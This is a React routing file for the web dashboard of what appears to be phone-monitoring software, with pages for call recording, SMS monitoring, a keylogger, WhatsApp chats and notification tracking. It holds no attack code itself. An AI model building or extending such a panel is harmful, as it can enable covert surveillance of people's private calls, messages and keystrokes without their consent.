import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";

// Layout
import Layout from "./components/layout/Layout";

// Auth
import Login from "./components/login/login";

// Pages
import Dashboard from "./pages/Dashboard";
import CallRecording from "./pages/CallRecording";
import CallHistory from "./pages/CallHistory";
// import IncomingCalls from "./pages/IncomingCalls";
// import OutgoingCalls from "./pages/OutgoingCalls";
import SmsMonitoring from "./pages/SmsMonitoring";
import Keylogger from "./pages/Keylogger";
import WhatsappChats from "./pages/WhatsappChats";
import WhatsappIncoming from "./pages/WhatsappIncoming";
import WhatsappOutgoing from "./pages/WhatsappOutgoing";
import WhatsappAudio from "./pages/WhatsappAudio";
import UsageTracking from "./pages/UsageTracking";
import NotificationTracking from "./pages/NotificationTracking";

export default function App() {
  return (
    <BrowserRouter>
      <Routes>
        {/* Login — root redirect */}
        <Route path="/" element={<Login />} />
        <Route path="/login" element={<Login />} />

        {/* Protected dashboard routes — all wrapped in Layout */}
        <Route element={<Layout />}>
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/call-recording" element={<CallRecording />} />
          <Route path="/call-history" element={<CallHistory />} />
          <Route path="/usage-tracking" element={<UsageTracking />} />
          <Route path="/notification-tracking" element={<NotificationTracking />} />
          {/* <Route path="/incoming-calls" element={<IncomingCalls />} />
          <Route path="/outgoing-calls" element={<OutgoingCalls />} /> */}
          <Route path="/sms-monitoring" element={<SmsMonitoring />} />
          <Route path="/keylogger" element={<Keylogger />} />
          <Route path="/wa-chats" element={<WhatsappChats />} />
          <Route path="/wa-incoming" element={<WhatsappIncoming />} />
          {/* <Route path="/wa-outgoing" element={<WhatsappOutgoing />} />
          <Route path="/wa-audio" element={<WhatsappAudio />} /> */}

        </Route>

        {/* Catch-all → login */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </BrowserRouter>
  );
}
